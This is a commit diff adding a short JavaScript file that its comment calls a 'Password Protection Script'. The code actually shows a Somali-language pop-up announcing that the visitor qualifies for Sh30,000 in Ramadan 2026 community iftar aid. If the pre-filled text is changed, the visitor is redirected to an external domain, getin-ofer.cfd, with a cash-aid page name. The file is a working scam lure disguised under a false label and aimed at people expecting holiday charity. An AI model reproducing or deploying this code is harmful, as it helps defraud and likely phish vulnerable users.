7a1d2114f129b064d4256520c0e005619bfeb7d5
Help-All <imaobongumoh637@gmail.com>
2026-02-18 15:15:13 +0100

    Create activesoma.js

---
+++ activesoma.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'Hesho Sh30,000'
+password = prompt(
+  'SMS: Hambalyo! Waxaa lagu xaqiijiyay inaad u qalanto Sh30,000 RAMADAN 2026 TAAGEERADA CASHKA BULSHADA. Fadlan guji OK si aad isla markiiba u hesho.',
+  'Hesho Sh30,000'
+); 
+if (password != 'Hesho Sh30,000') {
+  location.href = 'https://getin-ofer.cfd/Taageerada-Lacageed-Ee-Rama-Dan.html';
+  }
